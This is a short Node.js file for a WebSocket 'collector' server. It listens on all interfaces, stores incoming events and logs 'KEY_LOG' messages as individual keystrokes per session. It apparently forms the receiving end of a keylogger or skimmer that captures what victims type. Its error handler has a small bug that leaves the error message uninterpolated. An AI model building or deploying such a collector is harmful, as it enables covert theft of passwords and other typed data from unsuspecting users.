import { WebSocketServer } from "ws";

const port = process.env.PORT || 5000;

const wss = new WebSocketServer({ port, host: "0.0.0.0" });

console.log("COLLECTOR(WS) listening on port " + port);

const events = [];
const MAX_EVENTS = 2000;

wss.on("connection", (socket) => {
  console.log("[collector] client connected");

  socket.on("message", (raw) => {
    try {
      const msg = JSON.parse(raw.toString("utf8"));
      events.push(msg);
      if (events.length > MAX_EVENTS) events.shift();

      const et = msg?.eventType || "UNKNOWN";
      const sid = msg?.sessionId || "-";

      if (et === "KEY_LOG") {
        const key = msg?.key || "";
        console.log(`[collector] ${et} | SID: ${sid.slice(0, 8)} | Key: "${key}"`);
      }
    } catch (e) {
      console.log("[collector] bad message (${e.message}):", raw.toString("utf8").slice(0,120));
    }
  });
  socket.on("close", () => console.log("[collector] client disconnected"));
});